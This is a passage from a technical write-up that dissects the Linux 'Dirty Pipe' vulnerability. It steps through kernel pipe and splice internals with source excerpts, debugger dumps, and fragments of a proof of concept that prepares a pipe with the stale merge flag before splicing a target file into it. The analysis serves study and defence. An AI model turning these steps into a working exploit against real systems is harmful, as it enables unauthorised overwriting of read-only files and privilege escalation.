world\\n\u0026#34;, 16384) = 12 // wc reads from pipe ... We mostly care about anonymous pipes as seen in the example above but there are also named pipes (see, e.g., here )\nCheck out the excellent book The Linux Programming Interface by Michael Kerrisk, Chapter 44 \u0026ldquo;Pipes and FIFOs\u0026rdquo; for more information and examples.\nPipes (initialization) After opening the target file, our PoC process proceeds by creating a pipe:\nint pipefds[2]; ... pause_for_inspection(\u0026#34;About to create pipe()\u0026#34;); if (pipe(pipefds)) { exit(1); } ⬀ go to source code Let\u0026rsquo;s investigate what the kernel does to provide the pipe functionality.\nOverview Our system call is handled by the kernel function do_pipe2.\nSYSCALL_DEFINE1(pipe, int __user *, fildes) { return do_pipe2(fildes, 0); } ⬀ go to source code static int do_pipe2(int __user *fildes, int flags) { struct file *files[2]; int fd[2]; int error; error = __do_pipe_flags(fd, files, flags); if (!error) { if (unlikely(copy_to_user(fildes, fd, sizeof(fd)))) { fput(files[0]); fput(files[1]); put_unused_fd(fd[0]); put_unused_fd(fd[1]); error = -EFAULT; } else { fd_install(fd[0], files[0]); fd_install(fd[1], files[1]); } } return error; } ⬀ go to source code Here we can see that two integer file descriptors, backed by two distinct files, are created. One for the reading fd[0], and one for the writing fd[1] end of the pipe. The descriptors are also copied from the kernel to user space copy_to_user(fildes, fd, sizeof(fd)), where fildes is the user space pointer we specified with the call to pipe(pipefds) in our PoC.\nFollowing the call to __do_pipe_flags() reveals which data structures the kernel uses to implement our pipe. We summarized the relevant structures and their relationships in the following figure:\n┌──────────────────┐ ┌──────────────────────┐ ┌►│struct pipe_buffer│ ┌────────────────────────┐ ┌──►│struct pipe_inode_info│ │ │... │ ┌───► │struct file │ │ │ │ │ │page = Null │ │ │ │ │ │... │ │ │... │ File desciptor table │ │... │ │ │ │ │ ├──────────────────┤ │ │ │ │ │head = 0 │ │ │struct pipe_buffer│ int fd │ struct file *f │ │f_inode ───────────────┼──┐ │ │ │ │ │... │ ──────────┼───────────────── │ │ │ │ │ │tail = 0 │ │ │page = Null │ ... │ ... │ │fmode = O_RDONLY | ... │ │ ┌─────────────┐ │ │ │ │ │... │ │ │ │ │ ├─►│struct inode │ │ │ring_size = 16 │ │ ├──────────────────┤ pipefd_r │ f_read ──────┘ │... │ │ │ │ │ │ │ │ │ ... │ │ └────────────────────────┘ │ │... │ │ │... │ │ ├──────────────────┤ pipefd_w │ f_write ──────┐ │ │ │ │ │ │ │ │struct pipe_buffer│ │ │ ┌────────────────────────┐ │ │i_pipe ─────┼─┘ │bufs ─────────────────┼──┘ │... │ ... │ ... └───► │struct file │ │ │ │ │ │ │page = Null │ │ │ │ │ │... │ │... │ │... │ │ │... │ │ │ │ └──────────────────────┘ └──────────────────┘ │ │ │ │i_fop ──────┼─┐ │f_inode ───────────────┼──┘ │ │ │ ┌─────────────────────────────────────┐ │ │ │... │ └──►│struct file_operations │ │fmode = O_WRONLY | ... │ └─────────────┘ │ │ │ │ │... │ │... │ │ │ └────────────────────────┘ │read_iter = pipe_read │ │ │ │write_iter = pipe_write │ │ │ │... │ │ │ │splice_write = iter_file_splice_write│ │ │ │... │ └─────────────────────────────────────┘ The two integer file descriptors, representing the pipe in user space, are backed by two struct files that only differ in their permission bits. In particular, they both refer to the same struct inode.\nThe inode (index node) is a data structure in a Unix-style file system that describes a file-system object such as a file or a directory. Each inode stores the attributes and disk block locations of the object\u0026rsquo;s data. File-system object attributes may include metadata (times of last change, access, modification), as well as owner and permission data. [\u0026hellip;] A directory is a list of inodes with their assigned names. The list includes an entry for itself, its parent, and each of its children. source The i_fop field of the inode contains a pointer to a struct file_operations. This structure holds function pointers to the implementations of the various operations that can be performed on the pipe. Importantly, those include the functions the kernel will use to handle a process\u0026rsquo; request to read() or write() the pipe.\nconst struct file_operations pipefifo_fops = { .open = fifo_open, .llseek = no_llseek, .read_iter = pipe_read, .write_iter = pipe_write, .poll = pipe_poll, .unlocked_ioctl = pipe_ioctl, .release = pipe_release, .fasync = pipe_fasync, .splice_write = iter_file_splice_write, }; ⬀ go to source code As stated above, an inode is not limited to describing pipes, and for other file types this field would point to another set of function pointers / implementations.\nThe pipe-specific part of the inode is mostly contained in the struct pipe_inode_info pointed to by the i_pipe field.\n/** * struct pipe_inode_info - a linux kernel pipe * @mutex: mutex protecting the whole thing * @rd_wait: reader wait point in case of empty pipe * @wr_wait: writer wait point in case of full pipe * @head: The point of buffer production * @tail: The point of buffer consumption * @note_loss: The next read() should insert a data-lost message * @max_usage: The maximum number of slots that may be used in the ring * @ring_size: total number of buffers (should be a power of 2) * @nr_accounted: The amount this pipe accounts for in user-\u0026gt;pipe_bufs * @tmp_page: cached released page * @readers: number of current readers of this pipe * @writers: number of current writers of this pipe * @files: number of struct file referring this pipe (protected by -\u0026gt;i_lock) * @r_counter: reader counter * @w_counter: writer counter * @poll_usage: is this pipe used for epoll, which has crazy wakeups? * @fasync_readers: reader side fasync * @fasync_writers: writer side fasync * @bufs: the circular array of pipe buffers * @user: the user who created this pipe * @watch_queue: If this pipe is a watch_queue, this is the stuff for that **/ struct pipe_inode_info { struct mutex mutex; wait_queue_head_t rd_wait, wr_wait; unsigned int head; unsigned int tail; unsigned int max_usage; unsigned int ring_size; #ifdef CONFIG_WATCH_QUEUE bool note_loss; #endif unsigned int nr_accounted; unsigned int readers; unsigned int writers; unsigned int files; unsigned int r_counter; unsigned int w_counter; unsigned int poll_usage; struct page *tmp_page; struct fasync_struct *fasync_readers; struct fasync_struct *fasync_writers; struct pipe_buffer *bufs; struct user_struct *user; #ifdef CONFIG_WATCH_QUEUE struct watch_queue *watch_queue; #endif }; ⬀ go to source code At this point we can get a first idea of how pipes are implemented. On a high level, the kernel thinks of a pipe as a circular array of pipe_buffer structures (sometimes also called a ring). The bufs field is a pointer to the start of this array.\n/** * struct pipe_buffer - a linux kernel pipe buffer * @page: the page containing the data for the pipe buffer * @offset: offset of data inside the @page * @len: length of data inside the @page * @ops: operations associated with this buffer. See @pipe_buf_operations. * @flags: pipe buffer flags. See above. * @private: private data owned by the ops. **/ struct pipe_buffer { struct page *page; unsigned int offset, len; const struct pipe_buf_operations *ops; unsigned int flags; unsigned long private; }; ⬀ go to source code There are two positions in this array: one for writing to (the head) - and one for reading from (the tail) the pipe. The ring_size defaults to 16 and will always be a power of 2, which is why circularity is implemented by masking index accesses with ring_size - 1 (e.g., bufs[head \u0026amp; (ring_size - 1)]). The page field is a pointer to a struct page describing where the actual data held by the pipe_buffer is stored. We will elaborate more on the process of adding and consuming data below. Note that each pipe_buffer has one page associated which means that the total capacity of the pipe is ring_size * 4096 bytes (4KB).\nA process can get and set the size of this ring using the fcntl() system call with the F_GETPIPE_SZ and F_SETPIPE_SZ flags, respectively. Our PoC sets the size of its pipe to a single buffer (4KB / one page) for simplicity.\nvoid setup_pipe(int pipefd_r, int pipefd_w) { if (fcntl(pipefd_w, F_SETPIPE_SZ, PAGESIZE) != PAGESIZE) { exit(1); } ... } ⬀ go to source code Code We can also follow the setup of the pipe in the kernel source code. The initialization of the integer file descriptors happens in __do_pipe_flags().\nstatic int __do_pipe_flags(int *fd, struct file **files, int flags) { int error; int fdw, fdr; ... error = create_pipe_files(files, flags); ... fdr = get_unused_fd_flags(flags); ... fdw = get_unused_fd_flags(flags); ... audit_fd_pair(fdr, fdw); fd[0] = fdr; fd[1] = fdw; return 0; ... } ⬀ go to source code The backing files are initialized in create_pipe_files(). We can see that both files are identical up to permissions, contain a reference to the pipe in their private data, and are opened as streams .\nint create_pipe_files(struct file **res, int flags) { struct inode *inode = get_pipe_inode(); struct file *f; int error; ... f = alloc_file_pseudo(inode, pipe_mnt, \u0026#34;\u0026#34;, O_WRONLY | (flags \u0026amp; (O_NONBLOCK | O_DIRECT)), \u0026amp;pipefifo_fops); ... f-\u0026gt;private_data = inode-\u0026gt;i_pipe; res[0] = alloc_file_clone(f, O_RDONLY | (flags \u0026amp; O_NONBLOCK), \u0026amp;pipefifo_fops); ... res[0]-\u0026gt;private_data = inode-\u0026gt;i_pipe; res[1] = f; stream_open(inode, res[0]); stream_open(inode, res[1]); return 0; } ⬀ go to source code The initialization of the common inode structure happens in get_pipe_inode(). We can see that an inode is created and also information for the pipe is allocated and stored such that inode-\u0026gt;i_pipe can later be used to access the pipe from a given inode. Furthermore, inode-\u0026gt;i_fops specifies the implementations used for file operations on a pipe.\nstatic struct inode *get_pipe_inode(void) { struct inode *inode = new_inode_pseudo(pipe_mnt-\u0026gt;mnt_sb); struct pipe_inode_info *pipe; ... inode-\u0026gt;i_ino = get_next_ino(); pipe = alloc_pipe_info(); ... inode-\u0026gt;i_pipe = pipe; pipe-\u0026gt;files = 2; pipe-\u0026gt;readers = pipe-\u0026gt;writers = 1; inode-\u0026gt;i_fop = \u0026amp;pipefifo_fops; // lolcads: see description below /* * Mark the inode dirty from the very beginning, * that way it will never be moved to the dirty * list because \u0026#34;mark_inode_dirty()\u0026#34; will think * that it already _is_ on the dirty list. */ inode-\u0026gt;i_state = I_DIRTY; inode-\u0026gt;i_mode = S_IFIFO | S_IRUSR | S_IWUSR; inode-\u0026gt;i_uid = current_fsuid(); inode-\u0026gt;i_gid = current_fsgid(); inode-\u0026gt;i_atime = inode-\u0026gt;i_mtime = inode-\u0026gt;i_ctime = current_time(inode); return inode; ... } ⬀ go to source code Most of the pipe-specific setup happens is alloc_pipe_info(). Here you can see the actual creation of the pipe, not just the inode, but the pipe_buffers / pipe_inode_info-\u0026gt;bufs that hold the content / data of the pipe.\nstruct pipe_inode_info *alloc_pipe_info(void) { struct pipe_inode_info *pipe; unsigned long pipe_bufs = PIPE_DEF_BUFFERS; // lolcads: defaults to 16 struct user_struct *user = get_current_user(); unsigned long user_bufs; unsigned int max_size = READ_ONCE(pipe_max_size); // lolcads: allocate the inode info pipe = kzalloc(sizeof(struct pipe_inode_info), GFP_KERNEL_ACCOUNT); ... // lolcads: allocate the buffers with the page references pipe-\u0026gt;bufs = kcalloc(pipe_bufs, sizeof(struct pipe_buffer), GFP_KERNEL_ACCOUNT); if (pipe-\u0026gt;bufs) { // lolcads: set up the rest of the relevant fields init_waitqueue_head(\u0026amp;pipe-\u0026gt;rd_wait); init_waitqueue_head(\u0026amp;pipe-\u0026gt;wr_wait); pipe-\u0026gt;r_counter = pipe-\u0026gt;w_counter = 1; pipe-\u0026gt;max_usage = pipe_bufs; pipe-\u0026gt;ring_size = pipe_bufs; pipe-\u0026gt;nr_accounted = pipe_bufs; pipe-\u0026gt;user = user; mutex_init(\u0026amp;pipe-\u0026gt;mutex); return pipe; } ... } ⬀ go to source code Debugger We can print a summary of the freshly initialized pipe (after resizing it) by breaking at the end of pipe_fcntl(), which is the handler invoked in the case F_SETPIPE_SZ: of the switch statement inside do_fcntl() .\nstruct pipe_inode_info at 0xffff8881044aec00 \u0026gt; \u0026#39;head\u0026#39;: 0 \u0026gt; \u0026#39;tail\u0026#39;: 0 \u0026gt; \u0026#39;ring_size\u0026#39;: 1 \u0026gt; \u0026#39;bufs\u0026#39;: 0xffff888101f8a180 struct pipe_buffer at 0xffff888101f8a180 \u0026gt; \u0026#39;page\u0026#39;: NULL \u0026gt; \u0026#39;offset\u0026#39;: 0 \u0026gt; \u0026#39;len\u0026#39;: 0 \u0026gt; \u0026#39;ops\u0026#39;: NULL \u0026gt; \u0026#39;flags\u0026#39;: There\u0026rsquo;s not much to see yet, but we keep this as a reference to see how things evolve over time.\nPipes (reading/writing) Writing After allocating the pipe, the PoC proceeds by writing to it.\nvoid fill_pipe(int pipefd_w) { for (int i = 1; i \u0026lt;= PAGESIZE / 8; i++) { if (i == 1) { pause_for_inspection(\u0026#34;About to perform first write() to pipe\u0026#34;); } if (i == PAGESIZE / 8) { pause_for_inspection(\u0026#34;About to perform last write() to pipe\u0026#34;); } if (write(pipefd_w, \u0026#34;AAAAAAAA\u0026#34;, 8) != 8) { exit(1); } } } ⬀ go to source code By looking at the file operations of a pipe inode we can see that writes to a pipe are handled by pipe_write(). When data is moved across the kernel-user-space boundary (or within the kernel) one frequently encounters vectorized I/O using iov_iter objects. For our purposes we can think of them as buffers but feel free to follow the links to learn more (also this ).\nstatic ssize_t pipe_write(struct kiocb *iocb, struct iov_iter *from) { struct file *filp = iocb-\u0026gt;ki_filp; struct pipe_inode_info *pipe = filp-\u0026gt;private_data; unsigned int head; ssize_t ret = 0; size_t total_len = iov_iter_count(from); ssize_t chars; bool was_empty = false; ... /* * If it wasn\u0026#39;t empty we try to merge new data into * the last buffer. * * That naturally merges small writes, but it also * page-aligns the rest of the writes for large writes * spanning multiple pages. */ head = pipe-\u0026gt;head; was_empty = pipe_empty(head, pipe-\u0026gt;tail); chars = total_len \u0026amp; (PAGE_SIZE-1); if (chars \u0026amp;\u0026amp; !was_empty) { unsigned int mask = pipe-\u0026gt;ring_size - 1; struct pipe_buffer *buf = \u0026amp;pipe-\u0026gt;bufs[(head - 1) \u0026amp; mask]; int offset = buf-\u0026gt;offset + buf-\u0026gt;len; if ((buf-\u0026gt;flags \u0026amp; PIPE_BUF_FLAG_CAN_MERGE) \u0026amp;\u0026amp; offset + chars \u0026lt;= PAGE_SIZE) { ... ret = copy_page_from_iter(buf-\u0026gt;page, offset, chars, from); ... buf-\u0026gt;len += ret; if (!iov_iter_count(from)) goto out; } } for (;;) { ... head = pipe-\u0026gt;head; if (!pipe_full(head, pipe-\u0026gt;tail, pipe-\u0026gt;max_usage)) { unsigned int mask = pipe-\u0026gt;ring_size - 1; struct pipe_buffer *buf = \u0026amp;pipe-\u0026gt;bufs[head \u0026amp; mask]; struct page *page = pipe-\u0026gt;tmp_page; int copied; if (!page) { page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT); ... pipe-\u0026gt;tmp_page = page; } /* Allocate a slot in the ring in advance and attach an * empty buffer. If we fault or otherwise fail to use * it, either the reader will consume it or it\u0026#39;ll still * be there for the next write. */ spin_lock_irq(\u0026amp;pipe-\u0026gt;rd_wait.lock); head = pipe-\u0026gt;head; if (pipe_full(head, pipe-\u0026gt;tail, pipe-\u0026gt;max_usage)) { spin_unlock_irq(\u0026amp;pipe-\u0026gt;rd_wait.lock); continue; } pipe-\u0026gt;head = head + 1; spin_unlock_irq(\u0026amp;pipe-\u0026gt;rd_wait.lock); /* Insert it into the buffer array */ buf = \u0026amp;pipe-\u0026gt;bufs[head \u0026amp; mask]; buf-\u0026gt;page = page; buf-\u0026gt;ops = \u0026amp;anon_pipe_buf_ops; buf-\u0026gt;offset = 0; buf-\u0026gt;len = 0; if (is_packetized(filp)) buf-\u0026gt;flags = PIPE_BUF_FLAG_PACKET; else buf-\u0026gt;flags = PIPE_BUF_FLAG_CAN_MERGE; pipe-\u0026gt;tmp_page = NULL; copied = copy_page_from_iter(page, 0, PAGE_SIZE, from); ... ret += copied; buf-\u0026gt;offset = 0; buf-\u0026gt;len = copied; if (!iov_iter_count(from)) break; } if (!pipe_full(head, pipe-\u0026gt;tail, pipe-\u0026gt;max_usage)) continue; ... } out: ... return ret; } ⬀ go to source code When handling a write() to a pipe, the kernel differentiates between two cases. First it checks if it can append (at least a part of) the data to page of the pipe_buffer that is currently the head of the ring. Whether or not this is possible is decided by three things:\nis the pipe non-empty when we start writing? (implies that there are initialized buffers available)!was_empty is the PIPE_BUF_FLAG_CAN_MERGE flag set?buf-\u0026gt;flags \u0026amp; PIPE_BUF_FLAG_CAN_MERGE is there is enough space left on the page?offset + chars \u0026lt;= PAGE_SIZE If the answer to all of those questions is yes the kernel starts the write by appending to the existing page.\nTo complete the rest of the write the kernel advances the head to the next pipe_buffer, allocates a fresh page for it, initializes the flags (thePIPE_BUF_FLAG_CAN_MERGE flag will be set, unless the user explicitly asked for the pipe to be in O_DIRECT mode), and writes the data to the beginning of the new page. This continues until there is no data left to write (or the pipe is full). Regarding the O_DIRECT mode of pipe():\n[...] O_DIRECT (since Linux 3.4) Create a pipe that performs I/O in \u0026#34;packet\u0026#34; mode. Each write(2) to the pipe is dealt with as a separate packet, and read(2)s from the pipe will read one packet at a time. [...] source This is handled in the if-condition is_packetized(filp) in pipe_write() (see above).\nWe can also see these two types of writes in the debugger. The first write is into an empty pipe and thus initializes our previously zero-filled pipe buffer.\nstruct pipe_buffer at 0xffff888101f8a180 \u0026gt; \u0026#39;page\u0026#39;: 0xffffea00040e3bc0 \u0026gt; \u0026#39;offset\u0026#39;: 0 \u0026gt; \u0026#39;len\u0026#39;: 8 \u0026gt; \u0026#39;ops\u0026#39;: 0xffffffff8221bb00 \u0026lt;anon_pipe_buf_ops\u0026gt; \u0026gt; \u0026#39;flags\u0026#39;: PIPE_BUF_FLAG_CAN_MERGE struct page at 0xffffea00040e3bc0 \u0026gt; virtual: 0xffff8881038ef000 \u0026gt; data: b\u0026#39;AAAAAAAA\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\u0026#39;[...]b\u0026#39;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\u0026#39; All subsequent writes go down the \u0026ldquo;append path\u0026rdquo; and fill the existing page.\nstruct pipe_buffer at 0xffff888101f8a180 \u0026gt; \u0026#39;page\u0026#39;: 0xffffea00040e3bc0 \u0026gt; \u0026#39;offset\u0026#39;: 0 \u0026gt; \u0026#39;len\u0026#39;: 4096 \u0026gt; \u0026#39;ops\u0026#39;: 0xffffffff8221bb00 \u0026lt;anon_pipe_buf_ops\u0026gt; \u0026gt; \u0026#39;flags\u0026#39;: PIPE_BUF_FLAG_CAN_MERGE struct page at 0xffffea00040e3bc0 \u0026gt; virtual: 0xffff8881038ef000 \u0026gt; data: b\u0026#39;AAAAAAAAAAAAAAAAAAAA\u0026#39;[...]b\u0026#39;AAAAAAAAAAAAAAAAAAAA\u0026#39; Reading Next, the POC drains the pipe by consuming / reading all the As from the reading end.\nvoid drain_pipe(int pipefd_r) { char buf[8]; for (int i = 1; i \u0026lt;= PAGESIZE / 8; i++) { if (i == PAGESIZE / 8) { pause_for_inspection(\u0026#34;About to perform last read() from pipe\u0026#34;); } if (read(pipefd_r, buf, 8) != 8) { exit(1); } } } ⬀ go to source code The case where a process asks the kernel to read() from a pipe is handled by the function pipe_read().\nstatic ssize_t pipe_read(struct kiocb *iocb, struct iov_iter *to) { size_t total_len = iov_iter_count(to); struct file *filp = iocb-\u0026gt;ki_filp; struct pipe_inode_info *pipe = filp-\u0026gt;private_data; bool was_full, wake_next_reader = false; ssize_t ret; ... ret = 0; __pipe_lock(pipe); /* * We only wake up writers if the pipe was full when we started * reading in order to avoid unnecessary wakeups. * * But when we do wake up writers, we do so using a sync wakeup * (WF_SYNC), because we want them to get going and generate more * data for us. */ was_full = pipe_full(pipe-\u0026gt;head, pipe-\u0026gt;tail, pipe-\u0026gt;max_usage); for (;;) { /* Read -\u0026gt;head with a barrier vs post_one_notification() */ unsigned int head = smp_load_acquire(\u0026amp;pipe-\u0026gt;head); unsigned int tail = pipe-\u0026gt;tail; unsigned int mask = pipe-\u0026gt;ring_size - 1; ... if (!pipe_empty(head, tail)) { struct pipe_buffer *buf = \u0026amp;pipe-\u0026gt;bufs[tail \u0026amp; mask]; size_t chars = buf-\u0026gt;len; size_t written; int error; if (chars \u0026gt; total_len) { ... chars = total_len; } ... written = copy_page_to_iter(buf-\u0026gt;page, buf-\u0026gt;offset, chars, to); ... ret += chars; buf-\u0026gt;offset += chars; buf-\u0026gt;len -= chars; ... if (!buf-\u0026gt;len) { pipe_buf_release(pipe, buf); ... tail++; pipe-\u0026gt;tail = tail; ... } total_len -= chars; if (!total_len) break; /* common path: read succeeded */ if (!pipe_empty(head, tail)) /* More to do? */ continue; } if (!pipe-\u0026gt;writers) break; if (ret) break; if (filp-\u0026gt;f_flags \u0026amp; O_NONBLOCK) { ret = -EAGAIN; break; } ... } ... if (ret \u0026gt; 0) file_accessed(filp); return ret; } ⬀ go to source code If the pipe is non-empty, the data is taken from the tail-indexed pipe_buffer (in bufs). In case, a buffer is emptied during a read, the release function pointer of the ops field of the pipe_buffer is executed. For a pipe_buffer that was initialized by an earlier write(), the ops field is a pointer to the struct pipe_buf_operations anon_pipe_buf_ops.\nstatic const struct pipe_buf_operations anon_pipe_buf_ops = { .release = anon_pipe_buf_release, .try_steal = anon_pipe_buf_try_steal, .get = generic_pipe_buf_get, }; ⬀ go to source code /** * pipe_buf_release - put a reference to a pipe_buffer * @pipe: the pipe that the buffer belongs to * @buf: the buffer to put a reference to */ static inline void pipe_buf_release(struct pipe_inode_info *pipe, struct pipe_buffer *buf) { const struct pipe_buf_operations *ops = buf-\u0026gt;ops; buf-\u0026gt;ops = NULL; ops-\u0026gt;release(pipe, buf); } ⬀ go to source code static void anon_pipe_buf_release(struct pipe_inode_info *pipe, struct pipe_buffer *buf) { struct page *page = buf-\u0026gt;page; /* * If nobody else uses this page, and we don\u0026#39;t already have a * temporary page, let\u0026#39;s keep track of it as a one-deep * allocation cache. (Otherwise just release our reference to it) */ if (page_count(page) == 1 \u0026amp;\u0026amp; !pipe-\u0026gt;tmp_page) pipe-\u0026gt;tmp_page = page; else put_page(page); } ⬀ go to source code Thus, anon_pipe_buf_release() is executed, which calls put_page() to release our reference to the page. Note that while the ops pointer is set to NULL to signal that be buffer has been released, the page and flags fields of the pipe_buffer are left unmodified. It is thus the responsibility of code that might reuse a pipe buffer to initialize all its fields, otherwise the values are \u0026ldquo;uninitialized\u0026rdquo;. We can confirm this by printing the pipe structures after the last read.\nstruct pipe_inode_info at 0xffff8881044aec00 \u0026gt; \u0026#39;head\u0026#39;: 1 \u0026gt; \u0026#39;tail\u0026#39;: 1 \u0026gt; \u0026#39;ring_size\u0026#39;: 1 \u0026gt; \u0026#39;bufs\u0026#39;: 0xffff888101f8a180 struct pipe_buffer at 0xffff888101f8a180 \u0026gt; \u0026#39;page\u0026#39;: 0xffffea00040e3bc0 \u0026gt; \u0026#39;offset\u0026#39;: 4096 \u0026gt; \u0026#39;len\u0026#39;: 0 \u0026gt; \u0026#39;ops\u0026#39;: NULL \u0026gt; \u0026#39;flags\u0026#39;: PIPE_BUF_FLAG_CAN_MERGE Summary For us, the key takeaways are:\nWrites to a pipe can append to the page of a pipe_buffer if its PIPE_BUF_FLAG_CAN_MERGE flag is set. This flag is set by default for buffers that are initialized by writes. Emptying a pipe with a read() leaves the pipe_buffers\u0026rsquo; flags unmodified. However, writes to a pipe are not the only way fill it!\nPipes (splicing) Besides reading and writing, the Linux programming interface also offers the splice syscall for moving data from or to a pipe. This is what our PoC does next.\npause_for_inspection(\u0026#34;About to splice() file to pipe\u0026#34;); if (splice(tfd, 0, pipefds[1], 0, 5, 0) \u0026lt; 0) { exit(1); } ⬀ go to source code Since this syscall may not be as well-known as the others, let\u0026rsquo;s briefly discuss it from a user\u0026rsquo;s perspective.\nThe splice System Call (user land) SPLICE(2) Linux Programmer\u0026#39;s Manual SPLICE(2) NAME splice - splice data to/from a pipe SYNOPSIS #define _GNU_SOURCE /* See feature_test_macros(7) */ #include \u0026lt;fcntl.h\u0026gt; ssize_t splice(int fd_in, off64_t *off_in, int fd_out, off64_t *off_out, size_t len, unsigned int flags); DESCRIPTION splice() moves data between two file descriptors without copying between kernel address space and user address space. It transfers up to len bytes of data from the file descriptor fd_in to the file descriptor fd_out, where one of the file descriptors must refer to a pipe. The following semantics apply for fd_in and off_in: * If fd_in refers to a pipe, then off_in must be NULL. * If fd_in does not refer to a pipe and off_in is NULL, then bytes are read from fd_in starting from the file offset, and the file offset is adjusted appropri‐ ately. * If fd_in does not refer to a pipe and off_in is not NULL, then off_in must point to a buffer which specifies the starting offset from which bytes will be read from fd_in; in this case, the file offset of fd_in is not changed. Analogous statements apply for fd_out and off_out. As mentioned above, a process can obtain a file descriptor using the sys_open system call. If the process wishes to write the file content (or a part of it) into a pipe it has different options. It could read() the data from the file into a buffer in its memory (or mmap() the file) and then write() it to the pipe. However, this involves a total of three context switches (kernel-user-space boundary). To make this whole operation more efficient the Linux kernel implements the sys_splice system call. It essentially does the copying (not really a copy, see below) directly from one file descriptor to another one within the kernel space. As we will see, this makes a lot of sense because the content of a file or a pipe is already present in the kernel memory as a buffer or page or another structure. One of fd_in or fd_out must be a pipe. The other fd_xxx can be another pipe, a file, a socket, a block device, a character device. See Max Kellermann\u0026rsquo;s original blog post for an example how splicing is used to optimize real-world software (and how this application lead him to finding this bug :) Check out this to read how Linus Torvalds himself explains the splice system call 8-)\nThe splice System Call (Implementation) The very high level idea of the splice implementation is illustrated in the following figure. After splicing, both, the pipe and the page cache, have different views of the same underlying data in memory. You might want to open this SVG image in a new tab and zoom in a bit. To see that this figure is correct, we start from the system call\u0026rsquo;s entry point SYSCALL_DEFINE6(splice,...), and first arrive at the function __do_splice() that is responsible for copying the offset values from and to user space. The called function do_splice() determines if we want to splice to, from or between pipes. In the first case the function\nstatic long do_splice_to(struct file *in, loff_t *ppos, struct pipe_inode_info *pipe, size_t len, unsigned int flags); is called, which executes\nin-\u0026gt;f_op-\u0026gt;splice_read(in, ppos, pipe, len, flags); ⬀ go to source code From here on, the execution path depends on the type of file we want to splice to the pipe. Since our target is a regular file and our VM uses the ext2 file system, the correct implementation is found in ext2_file_operations. Note: If you debug the exploit on another machine with e.g. ext4 file system, feel free to follow this path\u0026hellip; we\u0026rsquo;ll meet again later ;) If you interested in this nice abstraction check out the Linux Virtual File System documentation.\nconst struct file_operations ext2_file_operations = { ... .read_iter = ext2_file_read_iter, ... .splice_read = generic_file_splice_read, ... }; ⬀ go to source code Calling generic_file_splice_read() (eventually\u0026hellip;) leads us to filemap_read(). Notice that at this point we switch from the file system fs/ into the memory management mm/ subsystem of the kernel.\n/** * filemap_read - Read data from the page cache. * @iocb: The iocb to read. * @iter: Destination for the data. * @already_read: Number of bytes already read by the caller. * * Copies data from the page cache. If the data is not currently present, * uses the readahead and readpage address_space operations to fetch it. * * Return: Total number of bytes copied, including those already read by * the caller. If an error happens before any bytes are copied, returns * a negative error number. */ ssize_t filemap_read(struct kiocb *iocb, struct iov_iter *iter, ssize_t already_read) { struct file *filp = iocb-\u0026gt;ki_filp; struct file_ra_state *ra = \u0026amp;filp-\u0026gt;f_ra; struct address_space *mapping = filp-\u0026gt;f_mapping; struct inode *inode = mapping-\u0026gt;host; struct folio_batch fbatch; ... folio_batch_init(\u0026amp;fbatch); ... do { ... error = filemap_get_pages(iocb, iter, \u0026amp;fbatch); ... for (i = 0; i \u0026lt; folio_batch_count(\u0026amp;fbatch); i++) { struct folio *folio = fbatch.folios[i]; size_t fsize = folio_size(folio); size_t offset = iocb-\u0026gt;ki_pos \u0026amp; (fsize - 1); size_t bytes = min_t(loff_t, end_offset - iocb-\u0026gt;ki_pos, fsize - offset); size_t copied; ... copied = copy_folio_to_iter(folio, offset, bytes, iter); already_read += copied; iocb-\u0026gt;ki_pos += copied; ra-\u0026gt;prev_pos = iocb-\u0026gt;ki_pos; ... } ... folio_batch_init(\u0026amp;fbatch); } while (iov_iter_count(iter) \u0026amp;\u0026amp; iocb-\u0026gt;ki_pos \u0026lt; isize \u0026amp;\u0026amp; !error); ... ⬀ go to source code In this function the actual copying (again no real byte-for-byte copy\u0026hellip; see below) of data from the page cache to the pipe takes place. In a loop, the data is copied in chunks by the call to copy_folio_to_iter(). Note that a folio is not quite the same as a page, but for our purposes this doesn\u0026rsquo;t matter.\ncopied = copy_folio_to_iter(folio, offset, bytes, iter); Besides, however, that if we look closer at the implementation of this operation in copy_page_to_iter_pipe(), we notice that the data is not actually copied at all!\nstatic size_t copy_page_to_iter_pipe(struct page *page, size_t offset, size_t bytes, struct iov_iter *i) { ... struct pipe_inode_info *pipe = i-\u0026gt;pipe; struct pipe_buffer *buf; unsigned int p_mask = pipe-\u0026gt;ring_size - 1; unsigned int i_head = i-\u0026gt;head; size_t off; ... off = i-\u0026gt;iov_offset; buf = \u0026amp;pipe-\u0026gt;bufs[i_head \u0026amp; p_mask]; if (off) { if (offset == off \u0026amp;\u0026amp; buf-\u0026gt;page == page) { /* merge with the last one */ buf-\u0026gt;len += bytes; i-\u0026gt;iov_offset += bytes; goto out; } i_head++; buf = \u0026amp;pipe-\u0026gt;bufs[i_head \u0026amp; p_mask]; } ... buf-\u0026gt;ops = \u0026amp;page_cache_pipe_buf_ops; get_page(page); buf-\u0026gt;page = page; buf-\u0026gt;offset = offset; buf-\u0026gt;len = bytes; ... ⬀ go to source code We first try to \u0026lsquo;append\u0026rsquo; the current copy operation to an earlier one by increasing the length of the pipe_buffer at head. In case this is not possible, we simply advance the head and put a reference to the page we copy into its page field while making sure that offset and length are set correctly. Indeed, the idea behind the efficiency of sys_splice is to implement it as a zero-copy operation, where pointers and reference counts are used instead of actually duplicating the data.\nClearly this code potentially reuses the pipe_buffers (buf = \u0026amp;pipe-\u0026gt;bufs[i_head \u0026amp; p_mask]), and thus all fields must be checked and maybe re-initialized (there exist some old values, that might not be correct anymore). In particular, the initialization of the flags is missing. As pointed out by Max Kellermann, it was missing since the commit that introduced this function.\nDebugger We can also observe the effect of the zero-copy operation and missing initialization in the debugger. This is the output from earlier,\nstruct file at 0xffff8881045b0800 \u0026gt; \u0026#39;f_mapping\u0026#39;: 0xffff8881017d9460 \u0026gt; filename: target_file struct address_space at 0xffff8881017d9460 \u0026gt; \u0026#39;a_ops\u0026#39;: 0xffffffff82226ce0 \u0026lt;ext4_aops\u0026gt; \u0026gt; \u0026#39;i_pages.xa_head\u0026#39; : 0xffffea0004156880 struct page at 0xffffea0004156880 \u0026gt; virtual: 0xffff8881055a2000 \u0026gt; data: b\u0026#39;File owned by 